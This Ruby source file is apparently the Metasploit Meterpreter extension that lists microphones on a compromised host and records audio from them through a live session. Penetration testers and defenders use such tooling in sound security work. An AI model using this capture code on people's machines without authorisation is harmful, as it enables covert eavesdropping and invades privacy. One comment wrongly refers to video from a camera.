# -*- coding: binary -*-

require 'rex/post/meterpreter/channel'
require 'rex/post/meterpreter/channels/pools/audio'

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Stdapi
          module Mic

###
#
# This meterpreter extension can list and capture from microphone
#
###
            class Mic
              include Msf::Post::Common

              def initialize(client)
                @client = client
              end

              def session
                @client
              end

              def mic_list
                response = client.send_request(Packet.create_request('audio_interface_list'))
                names = []
                response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_FULLNAME).each do |tlv|
                  names << tlv.value
                end
                names
              end

              # Starts recording video from video source of index +cam+
              def mic_start(cam)
                request = Packet.create_request('audio_interface_start')
                request.add_tlv(TLV_TYPE_AUDIO_INTERFACE_NAME, cam)
                client.send_request(request)
                true
              end

              def mic_get_frame(quality)
                request = Packet.create_request('audio_interface_get_frame')
                request.add_tlv(TLV_TYPE_AUDIO_DURATION, quality)
                response = client.send_request(request)
                response.get_tlv(TLV_TYPE_AUDIO_DATA).value
              end

              def mic_stop
                client.send_request(Packet.create_request('audio_interface_stop'))
                true
              end

              attr_accessor :client
            end
          end
        end
      end
    end
  end
end
